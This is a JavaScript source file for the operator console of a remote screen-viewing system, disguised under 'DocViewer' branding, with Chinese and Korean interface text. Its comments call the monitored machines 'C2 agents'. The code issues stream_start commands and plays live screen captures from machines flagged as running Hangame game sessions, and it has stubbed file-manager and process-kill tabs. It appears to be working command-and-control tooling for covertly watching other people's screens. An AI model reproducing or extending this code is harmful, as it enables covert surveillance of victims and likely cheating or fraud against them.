/* DocViewer admin console — i18n (default zh-CN, ko toggle) + API access.
  * Neutral admin console (plain document-viewer branding). */
(function () {
  "use strict";

  var I18N = {
    "zh-CN": {
      "app": "DocViewer",
      "login.sub": "请输入访问授权码进行连接",
      "login.ph": "访问授权码",
      "login.btn": "连接",
      "login.err": "授权码无效或无法连接",
      "tab.screen": "远程桌面",
      "tab.file": "文件管理",
      "tab.process": "进程",
      "btn.refresh": "刷新",
      "status.connected": "已连接",
      "sidebar.title": "设备列表",
      "search": "搜索...",
      "filter.gameonly": "仅看游戏",
      "screen.connecting": "请选择一个设备查看远程桌面。",
      "screen.nosignal": "无画面信号",
      "file.todo": "文件管理功能将在后续版本开放。",
      "proc.todo": "进程列表功能将在后续版本开放。",
      "info.title": "设备信息",
      "info.host": "主机名", "info.addr": "地址", "info.os": "系统",
      "info.state": "状态", "info.status": "设备号",
      "mode.title": "连接信息", "mode.game": "运行状态", "mode.last": "最后在线",
      "state.online": "在线", "state.offline": "离线",
      "proc.pid": "PID", "proc.name": "进程名", "proc.kill": "结束",
      "file.updir": "返回上级", "file.dir": "目录", "file.file": "文件",
      "file.name": "名称",
      "file.size": "大小", "file.modified": "修改时间",
      "file.err": "读取目录失败",
      "proc.err": "获取进程列表失败", "proc.killed": "进程已终止",
      "file.refresh": "刷新"
    },
    "ko": {
      "app": "DocViewer",
      "login.sub": "접속 인증 키를 입력해 연결하세요",
      "login.ph": "접속 인증 키",
      "login.btn": "연결",
      "login.err": "인증키가 올바르지 않거나 연결할 수 없습니다",
      "tab.screen": "원격 화면",
      "tab.file": "파일 관리",
      "tab.process": "프로세스",
      "btn.refresh": "새로고침",
      "status.connected": "연결됨",
      "sidebar.title": "장비 목록",
      "search": "검색...",
      "filter.gameonly": "한게임만",
      "screen.connecting": "장비를 선택하면 원격 화면을 볼 수 있습니다.",
      "screen.nosignal": "화면 신호 없음",
      "file.todo": "파일 관리 기능은 다음 단계에서 제공됩니다.",
      "proc.todo": "프로세스 목록 기능은 다음 단계에서 제공됩니다.",
      "info.title": "장비 정보",
      "info.host": "호스트명", "info.addr": "주소", "info.os": "OS",
      "info.state": "상태", "info.status": "장비 ID",
      "mode.label": "연결 정보", "mode.game": "실행 상태", "mode.last": "최근 접속",
      "state.online": "온라인", "state.offline": "오프라인",
      "proc.pid": "PID", "proc.name": "프로세스명", "proc.kill": "종료",
      "file.updir": "상위 폴더", "file.dir": "폴더", "file.file": "파일",
      "file.name": "이름",
      "file.size": "크기", "file.modified": "수정일",
      "file.err": "디렉토리 읽기 실패",
      "proc.err": "프로세스 목록 조회 실패", "proc.killed": "프로세스 종료됨",
      "file.refresh": "새로고침"
    }
  };

  var lang = null, devices = [], selectedId = null, token = null, currentStreamId = null,
  fileCache = {}, procCache = [], frameToken = 0;
  // MSE (H264 fMP4) playback state
  var mseMS = null, mseSB = null, mseMime = null, mseCurStream = -1, mseSinceSeq = -1,
      mseAppending = false, mseAppendQ = [], mseStopped = true, mseSeekDone = false;
  var mseWS = null;   // 활성 WS push 스트림 (없으면 pollMSE 폴백)
  var mseLastAppend = 0; // watchdog: WS 폴백 판정 기준 — 마지막 MSE append 시각
  var lastStreamCmdAt = 0;
  var winhipsClients = [], roster = [], dwellMap = {}, DWELL_MS = 120000; // 목록 고정: 시청 조건 이탈 후 2분 유예
  var userEverSelected = false;  // 사용자가 한 번 직접 선택하면 자동 선택/해제 안 함 (일시적 오프라인에도 선택 유지)
  var devRows = {}, devRowsSig = {}, devRowsOrder = "";

  function t(key) {
    var k = lang in I18N ? lang : "zh-CN";
    return (I18N[k] && I18N[k][key]) || key;
  }

  function setLang(l, apply) {
    lang = l;
    if (apply) { document.documentElement.lang = l; document.querySelectorAll("[data-i18n]").forEach(function (el) {
      el.textContent = t(el.getAttribute("data-i18n"));
    });
      document.querySelectorAll("[data-i18n-ph]").forEach(function (el) {
        el.placeholder = t(el.getAttribute("data-i18n-ph"));
      });
    }
  }

  function applyI18n() {
    var saved = localStorage.getItem("docviewer_lang") || "zh-CN";
    setLang(saved, true);
  }

  /* ---------- API ---------- */
  function api(path, opts) {
    opts = opts || {};
    opts.headers = Object.assign({}, opts.headers || {});
    if (token) opts.headers["X-Auth-Token"] = token;
    if (opts.json !== undefined) {
      opts.headers["Content-Type"] = "application/json";
      opts.body = JSON.stringify(opts.json);
      delete opts.json;
    }
    return fetch(path, opts).then(function (r) {
      if (r.status === 401) { showLogin(true); throw new Error("unauthorized"); }
      return r.json().then(function (j) { if (!r.ok) { var e = new Error(j.error || r.status); e.json = j; throw e; } return j; });
    });
  }

  /* ---------- views ---------- */
  function showLogin(show) {
    document.getElementById("login-view").classList.toggle("hidden", !show);
    document.getElementById("app-view").classList.toggle("hidden", show);
    if (show) document.getElementById("login-token").focus();
  }

  function setConn(ok) {
    var dot = document.getElementById("conn-dot");
    dot.classList.toggle("offline", !ok);
    document.getElementById("conn-dot").style.background = ok ? "#2ecc71" : "#777";
    document.getElementById("conn-text").textContent = ok ? t("status.connected") : t("state.offline");
  }

  function renderAgents() {
    var list = document.getElementById("dev-list");
    var q = (document.getElementById("dev-search").value || "").toLowerCase();
    var dwNow = Date.now();
    // C2 에이전트(시청 가능) + WinHips 노드를 한 목록으로
    var byId = {};
    roster.forEach(function (a) { if (a && a.id) byId[a.id] = a; });
    winhipsClients.forEach(function (c) {
      var id = c.agent_id || ("wh-" + (c.pcname || c.ip || ""));
      if (!id) return;
      var exist = byId[id];
      if (!exist) {
        byId[id] = {
          id: id,
          hostname: c.pcname || id,
          remote_addr: c.ip || c.lanip || "",
          mac: c.mac || "",
          game_id: c.gamenames || "",
          online: true,
          hangame: true,
          streamable: !!c.streamable,
          _winhips: true
        };
      } else {
        exist.hangame = exist.hangame || true;
        if (c.streamable) exist.streamable = true;
      }
    });
    var merged = Object.keys(byId).map(function (k) { return byId[k]; });
    var shown = merged.filter(function (a) {
      // 목록 고정: 시청 가능(초록) 좌석 + 유예 2분 내 이탈 좌석 유지 — 잠깐의 상태 불리기로 목록이 흔들리지 않게
      var qual = a.online && (a.hangame || a._winhips) && (a.streamable !== false);
      if (!qual && !(dwellMap[a.id] && dwNow - dwellMap[a.id] < DWELL_MS)) return false;
      if (!q) return true;
      return (a.hostname || "").toLowerCase().indexOf(q) >= 0 || (a.remote_addr || "").toLowerCase().indexOf(q) >= 0;
    });
    shown.sort(function (x, y) { return (x.hostname || x.id || "").localeCompare(y.hostname || y.id || "", undefined, { numeric: true }); });
    document.getElementById("dev-count").textContent = shown.length;
    document.getElementById("st-online").textContent = roster.filter(function (a) { return a.online && a.hangame && a.streamable; }).length;
    if (!shown.length) {
      list.innerHTML = '<div class="muted" style="padding:12px">—</div>';
      devRows = {}; devRowsSig = {}; devRowsOrder = "";
      return;
    }

    var orderKey = shown.map(function (a) { return a.id; }).join("\n");
    if (orderKey !== devRowsOrder) {
      // 키 집합·순서가 바뀐 경우(검색·목록 변동)에만 전체 재구성 — 평시엔 제자리 패치로 스크롤 유지
      list.innerHTML = "";
      devRows = {}; devRowsSig = {};
      devRowsOrder = orderKey;
    }

    shown.forEach(function (a) {
      // 제품 규칙: 초록 표시는 한게임 좌석 한정 (요구사항)
      var dotCls = (!a.online || !a.hangame || !a.streamable) ? "offline" : "online";
      var nameText = a.hostname || a.id;
      var ipText = a.remote_addr + " · " + (a.game_id || a.mac || "-");
      var active = a.id === selectedId;
      var sig = dotCls + "|" + nameText + "|" + ipText + "|" + (active ? "1" : "0");
      var row = devRows[a.id];
      if (!row) {
        row = document.createElement("div");
        row.className = "dev-item" + (active ? " active" : "");
        row.innerHTML = '<div class="dev-dot ' + dotCls + '"></div>' +
          '<div class="dev-info"><div class="dev-name"></div><div class="dev-ip"></div></div>';
        row.querySelector(".dev-name").textContent = nameText;
        row.querySelector(".dev-ip").textContent = ipText;
        list.appendChild(row);
        devRows[a.id] = row;
        devRowsSig[a.id] = sig;
      } else if (devRowsSig[a.id] !== sig) {
        row.className = "dev-item" + (active ? " active" : "");
        row.querySelector(".dev-dot").className = "dev-dot " + dotCls;
        row.querySelector(".dev-name").textContent = nameText;
        row.querySelector(".dev-ip").textContent = ipText;
        devRowsSig[a.id] = sig;
      }
      row.onclick = function () { selectDevice(a); };  // 클릭 시점엔 최신 로스터 객체여야 함
    });
  }

  function updateInfo(a) {
    var info = document.getElementById("info-host"); info.textContent = a.hostname || a.id;
    document.getElementById("info-addr").textContent = a.remote_addr || "-";
    document.getElementById("info-os").textContent = (a.os || "-") + " " + (a.arch || "");
    var st = document.getElementById("info-state");
    st.textContent = a.online ? t("state.online") : t("state.offline");
    st.style.color = a.online ? "#2ecc71" : "#777";
    document.getElementById("info-id").textContent = a.id;
    document.getElementById("info-game").textContent = a.game_id || (a.game_active ? t("state.online") : "-");
    document.getElementById("info-last").textContent = (a.last_seen || "").replace("T", " ").slice(0, 19);
  }

  function selectDevice(a) {
    if (selectedId !== a.id) stopStream();
    userEverSelected = true;
    selectedId = a.id;
    frameToken++;
    updateInfo(a);
    renderAgents();
    // 클릭 게이트: 한게임+온라인만 스트림 시청. 그 외엔 검정 플레이스홀더(재생 아이콘 없음).
    var sEl = document.getElementById("live-screen");
    if (a.online && a.hangame && a.streamable) {
      startStream(a.id); startLive(a.id, frameToken);
    } else {
      stopStream(); showIdle(a);
    }
  }

  function sendCmd(agentId, cmdType, payload) {
    return api("/admin/cmd", { method: "POST",
      json: { agent_id: agentId, cmd_type: cmdType, payload: payload || "" } }).catch(function () {});
  }

  function startStream(id) {
    if (currentStreamId === id) return;
    stopStream();
    currentStreamId = id;
    lastStreamCmdAt = Date.now();
    sendCmd(id, "stream_start", JSON.stringify({ fps: 8, quality: 70, max_dim: 1280 }));
  }

  function stopStream() {
    if (!currentStreamId) return;
    currentStreamId = null;
    stopMSE();
    // stream_stop를 보내지 않음. c2push는 stream_start 후 90초 TTL로 스스로 종료한다.
    // 전환마다 stop을 내면 직전 좌석 인코더가 죽고, 다시 누르면 콜드스타트(검정/재생아이콘)가 된다.
  }

  /* ---------- H264 fMP4 via MediaSource (MSE) ---------- */
  function b64ToU8(b64) {
    var bin = atob(b64);
    var arr = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
    return arr;
  }

  function mseResetSB() {
    mseAppending = false;
    mseAppendQ = [];
    if (mseSB) {
      try { if (!mseSB.updating) mseMS.removeSourceBuffer(mseSB); } catch (e) {}
      mseSB = null;
    }
    if (!mseMS || mseMS.readyState !== "open") return;
    var cands = [];
    if (mseMime) cands.push(mseMime);
    cands.push('video/mp4; codecs="avc1.42E01E"');
    cands.push('video/mp4');
    for (var i = 0; i < cands.length; i++) {
      try {
        mseSB = mseMS.addSourceBuffer(cands[i]);
        // "sequence" mode: normalize fMP4 decode-time (tfdt) to be contiguous.
        // The server ring-buffer serves recent segments whose tfdt keeps growing
        // while the encoder runs, so "segments" mode would place them far from
        // time 0 and the video would never show a frame.
        if (mseSB.mode) mseSB.mode = "sequence";
        mseSB.addEventListener("updateend", function () { mseAppending = false; mseTrim(false); msePump(); mseEnsurePlaying(); });
        return;
      } catch (e) {}
    }
  }

  function msePump() {
    if (mseAppending || !mseSB || mseSB.updating) return;
    if (!mseAppendQ.length) return;
    mseAppending = true;
    var u8 = mseAppendQ.shift();
    try { mseSB.appendBuffer(u8); }
    catch (e) {
      mseAppending = false;
      mseTrim(true);
    }
  }

  // 무한 append로 인한 MSE 쿼터 초과 방지 — force면 포화 복구용 적극 제거
  function mseTrim(force) {
    if (!mseSB || mseSB.updating) return;
    var s = document.getElementById("live-screen");
    var v = s ? s.querySelector("video.live-video") : null;
    if (!v || !v.buffered.length) return;
    var start = v.buffered.start(0);
    var over = v.currentTime - start;
    if (force ? over > 3 : over > 10) {
      try { mseSB.remove(start, Math.max(start, v.currentTime - (force ? 2 : 5))); } catch (e) {}
    }
  }

  function mseAppend(u8) {
    mseLastAppend = Date.now();
    mseAppendQ.push(u8);
    msePump();
  }

  function hidePlayOverlay() {
    var el = document.getElementById("play-overlay");
    if (el) el.style.display = "none";
  }
  function showPlayOverlay(v) {
    var s = document.getElementById("live-screen");
    if (!s || !v) return;
    var el = document.getElementById("play-overlay");
    if (!el) {
      el = document.createElement("div");
      el.id = "play-overlay";
      el.textContent = "▶";
      el.style.cssText = "position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:64px;color:#fff;background:rgba(0,0,0,.35);cursor:pointer;z-index:6";
      s.appendChild(el);
    }
    el.style.display = "flex";
    el.onclick = function (ev) {
      ev.preventDefault();
      ev.stopPropagation();
      var p = v.play();
      if (p && p.then) p.then(hidePlayOverlay).catch(function () {});
      else hidePlayOverlay();
    };
  }
  function mseEnsurePlaying() {
    var s = document.getElementById("live-screen");
    var v = s ? s.querySelector("video.live-video") : null;
    if (!v) return;
    if (v.buffered.length) {
      var end = v.buffered.end(v.buffered.length - 1);
      var start = v.buffered.start(0);
      // 첫 재생은 버퍼 시작부터. 라이브 끝으로 점프하면 키프레임 없어 검정이 됨.
      if (!mseSeekDone && end > start) {
        // 링에 이미 있는 최신 구간으로 점프 — 전환 즉시 현재 화면 (처음부터 재생하지 않음)
        try { v.currentTime = Math.max(start, end - 0.4); } catch (e) {}
        mseSeekDone = true;
      }
      // 2.5초 이상 밀릴 때만 따라잡기
      if (mseSeekDone && end - v.currentTime > 2.5) {
        try { v.currentTime = Math.max(start, end - 0.8); } catch (e) {}
      }
    }
    if (v.paused) {
      var p = v.play();
      if (p && p.then) {
        p.then(function () { if (v.videoWidth) hidePlayOverlay(); }).catch(function () { showPlayOverlay(v); });
      }
    } else if (v.videoWidth) {
      hidePlayOverlay();
    } else {
      showPlayOverlay(v);
    }
  }

  function stopMSE() {

    mseStopped = true;
    mseAppendQ = [];
    mseAppending = false;
    mseCurStream = -1;
    mseSinceSeq = -1;
    mseSeekDone = false;
    if (mseWS) {
      // 의도적 종료 — 핸들러를 먼저 지운야 폴백(pollMSE)이 발동하지 않음
      try { mseWS.onclose = null; mseWS.onerror = null; mseWS.onmessage = null; mseWS.close(); } catch (e) {}
      mseWS = null;
    }
    if (mseMS) {
      try {
        if (mseMS.readyState === "open") mseMS.endOfStream();
      } catch (e) {}
      mseMS = null;
    }
    mseSB = null;
    mseMime = null;
    var s = document.getElementById("live-screen");
    var v = s ? s.querySelector("video.live-video") : null;
    if (v) { try { v.pause(); } catch (e) {} v.removeAttribute("src"); try { v.load(); } catch (e) {} }
  }

  function startLive(aId, tok) {
    stopMSE();
    if (!window.MediaSource || !MediaSource.isTypeSupported) {
      fetchFrame(aId, tok);   // JPEG 폴백
      return;
    }
    var s = document.getElementById("live-screen");
    var video = s.querySelector("video.live-video");
    if (!video) {
      s.innerHTML = "";
      video = document.createElement("video");
      video.className = "live-video";
      video.autoplay = true; video.muted = true; video.playsInline = true;
      video.setAttribute("muted", "");
      video.setAttribute("playsinline", "");
      video.setAttribute("webkit-playsinline", "");
      video.controls = false;
      video.addEventListener("loadedmetadata", function () { mseEnsurePlaying(); });
      // 모바일: 재생 아이콘 탭도 사용자 제스처로 play()
      video.onclick = function () { var p = video.play(); if (p && p.catch) p.catch(function(){}); };
      s.style.position = "relative";
      s.appendChild(video);
    }
    mseStopped = false;
    mseSeekDone = false;   // 새 스트림 — 첫 append 후 라이브 엣지로 재정렬
    var ms = new MediaSource();
    var mobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent || "");
    // 모바일은 WS MSE가 재생 아이콘에 고정되는 경우가 있어, 예전 동작하던 롱폴로 시작
    ms.addEventListener("sourceopen", function () {
      // 롱폴은 세그가 계속 증가하는 것이 확인됨. WS는 초반 버스트 후 멈추는 경우가 있어 재생은 롱폴로 통일.
      pollMSE(aId, tok);
    });
    ms.addEventListener("sourceended", function () {});
    video.src = URL.createObjectURL(ms);
    mseMS = ms;
    // 클릭 제스처 안에서 즉시 play() — 모바일 자동재생 잠금 해제
    try { var up = video.play(); if (up && up.catch) up.catch(function(){}); } catch (e) {}
  }

  // WS push 스트림 (/admin/wsstream). 서버가 init+신규 세그먼트를 같은 바이너리
  // 레코드 포맷으로 밀어준다 — handleH264Raw 파이프라인 그대로 재사용.
  // WS가 죽으면(프록시/브라우저 종료 등) 폴백으로 pollMSE로 강등.
  function startWSMSE(aId, tok) {
    if (mseStopped || aId !== selectedId || tok !== frameToken) return;
    if (Date.now() - lastStreamCmdAt > 15000) { lastStreamCmdAt = Date.now(); sendCmd(aId, "stream_start", JSON.stringify({ fps: 15, quality: 70, max_dim: 1280 })); }
    var url = (location.protocol === "https:" ? "wss://" : "ws://") + location.host +
      "/admin/wsstream?agent_id=" + encodeURIComponent(aId) + "&token=" + encodeURIComponent(token || "");
    var ws;
    try { ws = new WebSocket(url); } catch (e) { pollMSE(aId, tok); return; }
    ws.binaryType = "arraybuffer";
    mseWS = ws;
    // stream_start 킵얼라이브 — pollMSE가 돌지 않는 동안에도 15초마다 전송.
    // mseWS가 교체/종료되면 스스로 멈춘다(폴백 pollMSE와 lastStreamCmdAt 공유).
    // watchdog: WS가 살아있어도 15초간 MSE append(=프레임 유입) 없으면 pollMSE로 강등.
    // 뷰어 무응답(검정/멈춤)의 주요 원인 — WS 폰 계속 열어두고 대기하는 것보다 안전.
    var wdg = setInterval(function () {
      if (mseWS !== ws || mseStopped || aId !== selectedId || tok !== frameToken) { clearInterval(wdg); return; }
      // init만 오고 media가 없으면 3초 안에 롱폴로 폴백 (재생 아이콘만 뜨는 주원인)
      if (Date.now() - mseLastAppend > 3000) {
        clearInterval(wdg);
        wsFallback(aId, tok, ws);
      }
    }, 500);
    var ka = setInterval(function () {
      if (mseWS !== ws || mseStopped || aId !== selectedId || tok !== frameToken) { clearInterval(ka); return; }
      if (Date.now() - lastStreamCmdAt > 15000) { lastStreamCmdAt = Date.now(); sendCmd(aId, "stream_start", JSON.stringify({ fps: 15, quality: 70, max_dim: 1280 })); }
    }, 5000);
    ws.onmessage = function (ev) {
      if (mseStopped || aId !== selectedId || tok !== frameToken) return;
      var d = ev.data;
      if (d instanceof ArrayBuffer) {
        handleH264Raw(d);
        setConn(true);
      } else if (d && d.arrayBuffer) {
        d.arrayBuffer().then(function (b) {
          if (!mseStopped && aId === selectedId && tok === frameToken) handleH264Raw(b);
        });
      }
    };
    ws.onclose = function () { wsFallback(aId, tok, ws); };
    ws.onerror = function () { wsFallback(aId, tok, ws); };
  }

  // WS→pollMSE 강등. onclose와 onerror가 둘 다 발동해도 폴러가 2배로 늘어나면
  // 안 되므로(과거 버그) mseWS 일치 검사로 정확히 한 번만 폴백한다.
  function wsFallback(aId, tok, ws) {
    if (mseWS !== ws) return;
    try { mseWS.onclose = null; mseWS.onerror = null; mseWS.onmessage = null; } catch (e) {}
    mseWS = null;
    if (!mseStopped && aId === selectedId && tok === frameToken) pollMSE(aId, tok);
  }

  function pollMSE(aId, tok) {
    if (mseStopped || aId !== selectedId || tok !== frameToken) return;
    if (Date.now() - lastStreamCmdAt > 15000) { lastStreamCmdAt = Date.now(); sendCmd(aId, "stream_start", JSON.stringify({ fps: 15, quality: 70, max_dim: 1280 })); }
    var url = "/admin/stream?agent_id=" + encodeURIComponent(aId) + "&format=raw&since_seq=" + mseSinceSeq + "&wait_sec=1";
    fetch(url, { headers: token ? { "X-Auth-Token": token } : {} }).then(function (r) {
      if (r.status === 401) { showLogin(true); throw new Error("unauthorized"); }
      // v19: 204 = 서버가 세그 도착까지 홀드했다가 창 끝에 놓은 것 — 짧은 백오프로 재폴
      if (r.status === 204) { setTimeout(function () { pollMSE(aId, tok); }, 150); return; }
      if (aId !== selectedId || tok !== frameToken || mseStopped) return;
      var ct = r.headers.get("Content-Type") || "";
      if (ct.indexOf("application/octet-stream") === 0) {
        return r.arrayBuffer().then(function (buf) {
          if (aId !== selectedId || tok !== frameToken || mseStopped) return;
          handleH264Raw(buf);
          setConn(true);
          // v19: 즉시 연속 롱폴 — 서버가 이벤트 대기로 전환돼 세그 도착 즉시 반응, 브라우저 갭 0(직렬 유지)
          setTimeout(function () { pollMSE(aId, tok); }, 0);
        });
      }
      // JSON 응답 = 구형 서버(format=raw 미지원) 또는 스트림 부재(404) → 기존 경로 유지
      return r.json().then(function (f) {
        if (aId !== selectedId || tok !== frameToken || mseStopped) return;
        if (f && f.mode === "h264") {
          handleH264(f, aId, tok);
          setConn(true);
        } else if (f && f.data_b64) {
          stopMSE();   // 레거시 JPEG 폴백
          fetchFrame(aId, tok);
          return;
        }
        setTimeout(function () { pollMSE(aId, tok); }, 150);
      });
    }).catch(function () {
      setTimeout(function () { pollMSE(aId, tok); }, 1000);
    });
  }

  // binary records: kind(1) | stream(8,LE) | seq(8,LE) | codecLen(1) | codec | payloadLen(4,LE) | payload
  function handleH264Raw(buf) {
    var dv = new DataView(buf);
    var n = buf.byteLength, off = 0;
    var freshGen = false, pending = [];
    while (off + 18 <= n) {
      var kind = dv.getUint8(off);
      var stream = dv.getUint32(off + 5, true) * 4294967296 + dv.getUint32(off + 1, true);
      var seq = dv.getUint32(off + 13, true) * 4294967296 + dv.getUint32(off + 9, true);
      var cl = dv.getUint8(off + 17);
      if (off + 22 + cl > n) return;
      var codec = "";
      for (var i = 0; i < cl; i++) codec += String.fromCharCode(dv.getUint8(off + 18 + i));
      var plen = dv.getUint32(off + 18 + cl, true);
      var poff = off + 22 + cl;
      if (poff + plen > n) return;
      var payload = new Uint8Array(buf, poff, plen);
      if (kind === 1) {
        if (stream !== mseCurStream) {
          mseCurStream = stream;
          mseMime = 'video/mp4; codecs="' + (codec || "avc1.42E01E") + '"';
          mseResetSB();
          mseSinceSeq = -1;
          mseSeekDone = false;
          mseAppend(payload);
          freshGen = true;
        }
      } else if (kind === 2) {
        if (seq > mseSinceSeq) {
          mseSinceSeq = seq;
          pending.push(payload);
        }
      }
      off = poff + plen;
    }
    if (freshGen) mseAppendQ = mseAppendQ.concat(pending);
    else for (var j = 0; j < pending.length; j++) mseAppend(pending[j]);
    msePump();
  }

  function handleH264(f, aId, tok) {
    if (!f || !f.init || !f.init.data_b64) return;
    var stream = f.init.stream || 0;
    if (stream !== mseCurStream) {
      mseCurStream = stream;
      mseMime = f.init.mime || 'video/mp4; codecs="' + (f.init.codec || "avc1.42E01E") + '"';
      mseResetSB();
      mseSinceSeq = -1;
      mseSeekDone = false;
      mseAppend(b64ToU8(f.init.data_b64));
    }
    var segs = f.segs || [];
    for (var i = 0; i < segs.length; i++) {
      var s = segs[i];
      if (s.seq > mseSinceSeq) {
        mseSinceSeq = s.seq;
        mseAppend(b64ToU8(s.data_b64));
      }
    }
    msePump();
  }

  function fetchFrame(aId, tok) {
    if (aId !== selectedId || tok !== frameToken) return;
    var url = "/admin/stream?agent_id=" + encodeURIComponent(aId);
    fetch(url, { headers: token ? { "X-Auth-Token": token } : {} }).then(function (r) {
      if (r.status === 401) { showLogin(true); throw new Error("unauthorized"); }
      if (r.status === 204) { setTimeout(function () { fetchFrame(aId, tok); }, 200); return; }
      return r.json().then(function (f) {
        if (aId !== selectedId || tok !== frameToken) return;
        if (f && f.data_b64) {
          var s = document.getElementById("live-screen");
          s.innerHTML = '<img class="live-img" src="data:' + (f.mime || "image/jpeg") + ';base64,' + f.data_b64 + '">';
          setConn(true);
        }
        setTimeout(function () { fetchFrame(aId, tok); }, 150);
      });
    }).catch(function () {
      setTimeout(function () { fetchFrame(aId, tok); }, 1000);
    });
  }

  function showIdle(a) {
    var s = document.getElementById("live-screen");
    s.innerHTML = '<div class="idle">' + t("screen.connecting") + '</div>';
  }

  /* ---------- file / process tabs (stubs) ---------- */
  function loadFileTab() {
    var el = document.getElementById("file-content");
    el.innerHTML = '<div class="muted">' + t("file.todo") + '</div>';
  }

  function loadProcTab() {
    var el = document.getElementById("proc-content");
    el.innerHTML = '<div class="muted">' + t("proc.todo") + '</div>';
  }

  /* ---------- init ---------- */
  function init() {
    applyI18n();
    document.getElementById("lang-zh").onclick = function () { setLang("zh-CN", true); localStorage.setItem("docviewer_lang", "zh-CN"); };
    document.getElementById("lang-ko").onclick = function () { setLang("ko", true); localStorage.setItem("docviewer_lang", "ko"); };
    document.getElementById("login-btn").onclick = function () {
      token = document.getElementById("login-token").value.trim();
      if (!token) return;
      api("/admin/agents").then(function (j) {
        showLogin(false);
        setConn(true);
        refreshAgents();
        refreshWinhips();
        var poll = setInterval(refreshAgents, 3000);
        var whPoll = setInterval(refreshWinhips, 3000);
        window._agentPoll = poll;
        window._whPoll = whPoll;
      }).catch(function () {
        document.getElementById("login-err").textContent = t("login.err");
      });
    };
    document.getElementById("login-token").onkeydown = function (e) { if (e.key === "Enter") document.getElementById("login-btn").click(); };
    document.getElementById("btn-refresh").onclick = refreshAgents;
    document.getElementById("dev-search").oninput = renderAgents;
    document.getElementById("tab-screen").onclick = function () { showTab("screen"); };
    document.getElementById("tab-file").onclick = function () { showTab("file"); loadFileTab(); };
    document.getElementById("tab-process").onclick = function () { showTab("process"); loadProcTab(); };
    // 초기 부팅 시 로그인 게이트를 보이게 (둘 다 hidden이면 완전 백/검정 화면)
    showLogin(true);
  }

  function showTab(name) {
    ["screen", "file", "process"].forEach(function (t) {
      document.getElementById("tab-" + t).classList.toggle("active", t === name);
      document.getElementById("pane-" + t).classList.toggle("hidden", t !== name);
    });
  }

  function refreshWinhips() {
    api("/tools/winhips_clients.json").then(function (j) {
      winhipsClients = (j && j.clients) || [];
      renderAgents();
    }).catch(function () {});
  }

  function refreshAgents() {
    api("/admin/agents").then(function (j) {
      roster = (j.agents || []).map(function (a) {
        a.hangame = !!a.game_active || !!a.game_id;
        a.streamable = a.stream_enable !== false;
        return a;
      });
      renderAgents();
      setConn(true);
    }).catch(function () { setConn(false); });
  }

  init();
})();
